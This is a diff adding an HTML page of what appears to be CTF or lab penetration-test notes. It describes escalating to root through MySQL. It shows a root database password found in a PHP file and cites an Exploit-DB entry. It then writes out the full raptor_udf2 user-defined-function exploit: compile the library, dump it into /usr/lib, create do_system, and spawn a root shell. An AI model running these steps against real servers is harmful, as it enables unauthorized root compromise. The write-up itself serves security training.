@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>method2 - sql</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>method2 - sql</h1><br/><p><h2>Now when we move to /var/www/978345210/ and see the login.php we found mysql creds for root</h2>:</p><p></p><p><img src="images/23-1.png" alt="images/23-1.png" /></p><p></p><p></p><p>we get the root id and password: </p><p>we also see that the sql  version:</p><p></p><p><img src="images/23-2.png" alt="images/23-2.png" /></p><p></p><p>we get the exploit: <a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p><p></p><p></p><p>then:</p><p></p><p>copy raptor_udf2.c to smeagol home directory and follow below steps</p><p>* gcc -g -c raptor_udf2.c</p><p>* gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</p><p>* mysql -u root -p #login with the password darkshadow</p><p>* mysql&gt; use mysql;</p><p>* mysql&gt; create table foo(line blob);</p><p>* mysql&gt; insert into foo values(load_file(‘/home/smeagol/raptor_udf2.so’));</p><p>* mysql&gt; select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;</p><p>* mysql&gt; create function do_system returns integer soname ‘raptor_udf2.so’;</p><p>* select * from mysql.func;</p><p>* select do_system(‘id &gt; /tmp/out; chown raptor.raptor /tmp/out’);</p><p>* \! sh</p><p>* id </p><p>uid=0(root) gid=0(root) groups=0(root)</p></div>
+</body>
+</html>
